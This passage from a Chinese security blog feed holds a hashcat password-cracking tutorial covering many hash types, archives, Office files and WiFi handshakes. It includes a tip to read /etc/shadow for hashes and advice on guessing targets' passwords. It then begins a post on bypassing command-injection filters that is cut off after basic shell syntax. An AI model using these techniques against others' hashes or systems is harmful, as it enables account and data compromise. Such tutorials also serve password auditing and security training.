class="line">CPU：Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz</span><br><span class="line">显卡：GTX 1050 Ti</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="7位数字破解"><a href="#7位数字破解" class="headerlink" title="7位数字破解"></a>7位数字破解</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 0 --force 25c3e88f81b4853f2a8faacad4c871b6 ?d?d?d?d?d?d?d</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190128211124-36baa378-22fe-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="7位小写字母破解："><a href="#7位小写字母破解：" class="headerlink" title="7位小写字母破解："></a>7位小写字母破解：</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 0 --force 7a47c6db227df60a6d67245d7d8063f3 ?l?l?l?l?l?l?l</span><br></pre></td></tr></tbody></table></figure><h2 id="1-8位数字破解："><a href="#1-8位数字破解：" class="headerlink" title="1-8位数字破解："></a>1-8位数字破解：</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 0 --force 4488cec2aea535179e085367d8a17d75 --increment --increment-min 1 --increment-max 8 ?d?d?d?d?d?d?d?d</span><br></pre></td></tr></tbody></table></figure><h2 id="1-8位小写字母-数字破解"><a href="#1-8位小写字母-数字破解" class="headerlink" title="1-8位小写字母+数字破解"></a>1-8位小写字母+数字破解</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 0 --force ab65d749cba1656ca11dfa1cc2383102 --increment --increment-min 1 --increment-max 8 ?h?h?h?h?h?h?h?h</span><br></pre></td></tr></tbody></table></figure><h2 id="特定字符集：123456abcdf"><a href="#特定字符集：123456abcdf" class="headerlink" title="特定字符集：123456abcdf!@+-"></a>特定字符集：123456abcdf!@+-</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1</span><br><span class="line">注意一下：这里的-1和?1是数字1，不是字母l</span><br></pre></td></tr></tbody></table></figure><h2 id="1-8为位符集-123456abcdf"><a href="#1-8为位符集-123456abcdf" class="headerlink" title="1-8为位符集:123456abcdf!@+-"></a>1-8为位符集:123456abcdf!@+-</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -1 123456abcdf!@+- 9054fa315ce16f7f0955b4af06d1aa1b --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></tbody></table></figure><h2 id="1-8位数字-大小写字母-可见特殊符号"><a href="#1-8位数字-大小写字母-可见特殊符号" class="headerlink" title="1-8位数字+大小写字母+可见特殊符号"></a>1-8位数字+大小写字母+可见特殊符号</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -1 ?d?u?l?s d37fc9ee39dd45a7717e3e3e9415f65d --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1</span><br><span class="line">或者：</span><br><span class="line">hashcat64.exe -a 3 d37fc9ee39dd45a7717e3e3e9415f65d --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a</span><br></pre></td></tr></tbody></table></figure><h2 id="字典破解"><a href="#字典破解" class="headerlink" title="字典破解"></a>字典破解</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-a 0是指定字典破解模式，-o是输出结果到文件中</span><br><span class="line">hashcat64.exe -a 0 ede900ac1424436b55dc3c9f20cb97a8 password.txt -o result.txt</span><br></pre></td></tr></tbody></table></figure><h2 id="批量破解"><a href="#批量破解" class="headerlink" title="批量破解"></a>批量破解</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 0 hash.txt password.txt -o result.txt</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190128214002-36ab009a-2302-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="字典组合破解："><a href="#字典组合破解：" class="headerlink" title="字典组合破解："></a>字典组合破解：</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 1 25f9e794323b453885f5181f1b624d0b pwd1.txt pwd2.txt</span><br></pre></td></tr></tbody></table></figure><h2 id="字典-掩码破解"><a href="#字典-掩码破解" class="headerlink" title="字典+掩码破解"></a>字典+掩码破解</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 6 9dc9d5ed5031367d42543763423c24ee password.txt ?l?l?l?l?l</span><br></pre></td></tr></tbody></table></figure><h2 id="Mysql4-1-5的PASSWORD函数"><a href="#Mysql4-1-5的PASSWORD函数" class="headerlink" title="Mysql4.1/5的PASSWORD函数"></a>Mysql4.1/5的PASSWORD函数</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129111353-e7ea461a-2373-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d</span><br></pre></td></tr></tbody></table></figure><h2 id="sha512crypt-6-SHA512-Unix-破解"><a href="#sha512crypt-6-SHA512-Unix-破解" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)破解"></a>sha512crypt $6$, SHA512 (Unix)破解</h2><p>可以<code>cat /etc/shadow</code>获取<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 1800 --force $6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew/xd0O0hPG/yrm2X. ?l?l?l?l</span><br></pre></td></tr></tbody></table></figure><p></p><p>不用整理用户名，使用–username<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 1800 --force qiyou:$6$QDq75ki3$jsKm7qTDHz/xBob0kF1Lp170Cgg0i5Tslf3JW/sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1 ?l?l?l?l?l --username</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Windows-NT-hash，LM-hash破解"><a href="#Windows-NT-hash，LM-hash破解" class="headerlink" title="Windows NT-hash，LM-hash破解"></a>Windows NT-hash，LM-hash破解</h2><p>可以用<code>saminside</code>获取<code>NT-hash,LM-hash</code>的值<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129105751-ab0ebcf0-2371-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NT-hash:</span><br><span class="line">hashcat64.exe -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l</span><br><span class="line">LM-hash:</span><br><span class="line">hashcat64.exe -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l</span><br></pre></td></tr></tbody></table></figure><h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d</span><br></pre></td></tr></tbody></table></figure><h2 id="wordpress密码hash破解"><a href="#wordpress密码hash破解" class="headerlink" title="wordpress密码hash破解"></a>wordpress密码hash破解</h2><p>具体加密脚本在<code>./wp-includes/class-phpass.php</code>的<code>HashPassword</code>函数<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 400 --force $P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY/ ?d?d?d?d?d?d</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="discuz用户密码hash破解"><a href="#discuz用户密码hash破解" class="headerlink" title="discuz用户密码hash破解"></a>discuz用户密码hash破解</h2><p>其密码加密方式<code>md5(md5($pass).$salt)</code><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="破解RAR压缩密码"><a href="#破解RAR压缩密码" class="headerlink" title="破解RAR压缩密码"></a>破解RAR压缩密码</h2><p>首先rar2john获取rar文件hash值<a href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z" title="下载地址" target="_blank" rel="noopener">下载地址</a><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取rar文件的hash值：rar2john.exe 1.rar</span><br><span class="line">结果：</span><br><span class="line">1.rar:$rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8$04a52d2224ad082e</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129204720-047d9804-23c4-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13000 --force $rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8$04a52d2224ad082e ?d?d?d?d?d?d</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129163411-a6de7830-23a0-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>注意：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashcat 支持 RAR3-hp 和 RAR5，官方示例如下：</span><br><span class="line"></span><br><span class="line">-m参数类型示例 hash</span><br><span class="line">12500 RAR3-hp$RAR3$*0*45109af8ab5f297a*adbf6c5385d7a40373e8f77d7b89d317</span><br><span class="line">13000 RAR5$rar5$16$74575567518807622265582327032280$15$f8b4064de34ac02ecabfe</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="zip密码破解"><a href="#zip密码破解" class="headerlink" title="zip密码破解"></a>zip密码破解</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用zip2john获取文件的hash值：zip2john.exe 1.zip</span><br><span class="line">结果：1.zip:$zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$/zip2$:::::1.zip-1.txt</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129204743-120aca1e-23c4-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13600 $zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$/zip2$ --force ?d?d?d?d?d?d</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129164533-3d55655c-23a2-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="破解office密码"><a href="#破解office密码" class="headerlink" title="破解office密码"></a>破解office密码</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取office的hash值：python office2john.py 11.docx</span><br><span class="line">结果：11.docx:$office$*2013*100000*256*16*e4a3eb62e8d3576f861f9eded75e0525*9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129204911-467e16b6-23c4-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 9600 $office$*2013*100000*256*16*e4a3eb62e8d3576f861f9eded75e0525*9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9 --force ?d?d?d?d?d?d</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129165754-f7280e66-23a3-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="破解WIFI密码"><a href="#破解WIFI密码" class="headerlink" title="破解WIFI密码"></a>破解WIFI密码</h2><p>首先先把我们的握手包转化为<code>hccapx</code>格式，现在最新版的<code>hashcat</code>只支持<code>hccapx</code>格式了，以前的<code>hccap</code>格式已经不支持了<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">官方在线转化https://hashcat.net/cap2hccapx/</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 2500 1.hccapx 1391040?d?d?d?d</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129172412-a3e3e92e-23a7-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><ol><li>对于破解过的hash值，用<figure class="highlight plain"><figcaption><span>hash --show```查看结果</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2. 所有的hash破解结果都在hashcat.potfile文件中</span><br><span class="line">3. 如果破解的时间太长，可以按s键可以查看破解的状态，p键暂停，r键继续破解，q键退出破解。</span><br><span class="line">4. 在使用GPU模式进行破解时，可以使用-O参数自动进行优化</span><br><span class="line">5. 在实际破解中的建议，如果我们盲目的去破解，会占用我们大量的时间和资源</span><br></pre></td></tr></tbody></table></figure></li></ol><p>1.首先走一遍常用的弱口令字典<br>2.组合密码，如：zhang1999，用姓氏和出生年组合，当然也可以用其它的组合，这里举个例子而已<br>3.把常用的掩码组合整理起来放在masks中的.hcmask文件中，然后让它自动加载破解<br>4.如果实在不行，你可以尝试低位数的所有组合去跑，不过不建议太高位数的组合去破解，因为如果对方设置的密码很复杂的话，到头来你密码没有破解到，却浪费了大量的时间和资源，得不偿失<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">6.HashCat参数优化</span><br><span class="line">考虑到hashcat的破解速度以及资源的分配，我们可以对一些参数进行配置</span><br><span class="line">1.Workload tuning 负载调优。</span><br><span class="line">该参数支持的值有1,8,40,80,160</span><br></pre></td></tr></tbody></table></figure><p></p><pre><code>--gpu-accel 160 可以让GPU发挥最大性能。<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2.Gpu loops 负载微调</span><br><span class="line">该参数支持的值的范围是8-1024（有些算法只支持到1000）。</span><br></pre></td></tr></tbody></table></figure>--gpu-loops 1024 可以让GPU发挥最大性能。<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.Segment size 字典缓存大小</span><br><span class="line">该参数是设置内存缓存的大小，作用是将字典放入内存缓存以加快字典破解速度，默认为32MB，可以根据自身内存情况进行设置，当然是越大越块了。</span><br></pre></td></tr></tbody></table></figure>--segment-size 512 可以提高大字典破解的速度。```</code></pre><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://hashcat.net/wiki/doku.php?id=hashcat" title="Hashcat的Wiki" target="_blank" rel="noopener">Hashcat Wiki</a><br><a href="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" title="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypass一些命令注入限制的姿势</title>
      <link href="/2019/02/01/Bypass%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E9%99%90%E5%88%B6%E7%9A%84%E5%A7%BF%E5%8A%BF/"/>
      <url>/2019/02/01/Bypass%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E9%99%90%E5%88%B6%E7%9A%84%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于设置社区<a href="https://xz.aliyun.com/t/3918" target="_blank" rel="noopener">https://xz.aliyun.com/t/3918</a></p></blockquote><h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>OS命令注入(也称为shell注入)是一种web安全漏洞，它允许攻击者在运行应用程序的服务器上执行任意操作系统(OS)命令，通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用OS命令注入漏洞来破坏宿主基础设施的其他部分，利用信任关系将攻击转移到组织内的其他系统。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>说到命令注入，我们不得不提到命令注入中几个常用的符号。</p><h2 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法格式如下：</span><br><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 ...]</span><br><span class="line">1 命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</span><br><span class="line">2 只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。</span><br><span class="line">3 只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行。</span><br></pre></td></tr></tbody></table></figure><h2 id="管道符号"><a href="#管道符号" class="headerlink" title="|(管道符号)"></a>|(管道符号)</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| 表示管道，上一条命令的输出，作为下一条命令的参数</span><br></pre></td></tr></tbody></table></figure><h2 id=""><a href="#" class="headerlink" title="||"></a>||</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法格式如下：</span><br><span class="line">command1 || command2 [|| command3 ...]</span><br><span class="line">1 命令之间使用 || 连接，实现逻辑或的功能。</span><br><span class="line">2 只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</span><br><span class="line">3 只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行。</span><br></pre></td></tr></tbody></table></figure><h2 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; 表示将任务置于后台执行</span><br></pre></td></tr></tbody></table></figure><h2 id="分号"><a href="#分号" class="headerlink" title=";(分号)"></a>;(分号)</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br></pre></td></tr></tbody></table></figure><h2 id="和"><a href="#和" class="headerlink" title="``和$()"></a>``和$()</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在bash中，$( )与` `（反引号）都是用来作命令替换的。</span><br><span class="line">各自的优缺点：</span><br><span class="line">1. ` ` 基本上可用在全部的 unix shell 中使用，若写成 shell脚本，其移植性比较高，但反单引号容易打错或看错。</span><br><span class="line">2. $()更有可读性，但是$()并不是所有shell都支持。</span><br></pre></td></tr></tbody></table></figure><h2 id="和-1"><a href="#和-1" class="headerlink" title="()和{}"></a>()和{}</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">如果希望把几个命令合在一起执行，shell提供了两种方法。既可以在当前shell也可以在子shell中执行一组命令。</span><br><span class="line">(command1;command2;command3....)</span><br><span class="line">{ command1;command2;command3…} #第一条命令必须与左边的括号有一个空格，最后一条命令一定要有分号</span><br><span class="line"></span><br><span class="line">相同点：</span><br><span class="line">()和{}都是把一串的命令放在括号里面,并且命令之间用;号隔开</span><br><span class="line">不同点</span><br><span class="line">()只是对一串命令重新开一个子shell进行执行,{}对一串命令在当前shell执行</span><br><span class="line">()最后一个命令可以不用分号,{}最后一个命令要用分号</span><br><span class="line">()里的第一个命令和左边括号不必有空格,{}的第一个命令和左括号之间必须要有一个空格</span><br><span class="line">()和{}中括号里面的某个命令的重定向只影响该命令,但括号外的重定向则影响到括号里的所有命令</span><br></pre></td></tr></tbody></table></figure><h2 id="Shell-输入-输出重定向"><a href="#Shell-输入-输出重定向" class="headerlink" title="Shell 输入/输出重定向"></a>Shell 输入/输出重定向</h2><p>来自菜鸟教程：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">命令说明：</span><br><span class="line">command &gt; file：将输出重定向到 file。</span><br><span class="line">command &lt; file：将输入重定向到 file。</span><br><span class="line">command &gt;&gt; file：将输出以追加的方式重定向到 file。</span><br><span class="line">n &gt; file：将文件描述符为 n 的文件重定向到 file。</span><br><span class="line">n &gt;&gt; file：将文件描述符为 n 的文件以追加的方式重定向到 file。</span><br><span class="line">n &gt;&amp; m：将输出文件 m 和 n 合并。</span><br><span class="line">n &lt;&amp; m：将输入文件 m 和 n 合并。</span><br><span class="line">&lt;&lt; tag：将开始标记 tag 和结束标记 tag 之间的内容作为输入。</span><br><span class="line"></span><br><span class="line">需要注意的是文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。</span><br></pre></td></tr></tbody></table></figure><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">^</span><br><span class="line">匹配输入字符串的开始位置。</span><br><span class="line"></span><br><span class="line">$</span><br><span class="line">匹配输入字符串的结束位置。</span><br><span class="line"></span><br><span class="line">*</span><br><span class="line">匹配前面的子表达式零次或多次</span><br><span class="line"></span><br><span class="line">+</span><br><span class="line">匹配前面的子表达式一次或多次。</span><br><span class="line"></span><br><span class="line">?</span><br><span class="line">匹配前面的子表达式零次或一次。</span><br><span class="line"></span><br><span class="line">{n}</span><br><span class="line">n 是一个非负整数。匹配确定的 n 次。</span><br><span class="line"></span><br><span class="line">{n,}</span><br><span class="line">n 是一个非负整数。至少匹配n 次。</span><br><span class="line"></span><br><span class="line">{n,m}</span><br><span class="line">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。</span><br><span class="line"></span><br><span class="line">?</span><br><span class="line">当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。</span><br><span class="line"></span><br><span class="line">.</span><br><span class="line">匹配除换行符（\n、\r）之外的任何单个字符。</span><br><span class="line"></span><br><span class="line">[xyz]</span><br><span class="line">字符集合。匹配所包含的任意一个字符。</span><br></pre></td></tr></tbody></table></figure><p>还有一些内置的通用字符簇<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[[:alpha:]] 任何字母</span><br><span class="line">[[:digit:]] 任何数字</span><br><span class="line">[[:alnum:]] 任何字母和数字</span><br><span class="line">[[:space:]] 任何空白字符</span><br><span class="line">[[:upper:]] 任何大写字母</span><br><span class="line">[[:lower:]] 任何小写字母</span><br><span class="line">[[:punct:]] 任何标点符号</span><br><span class="line">[[:xdigit:]] 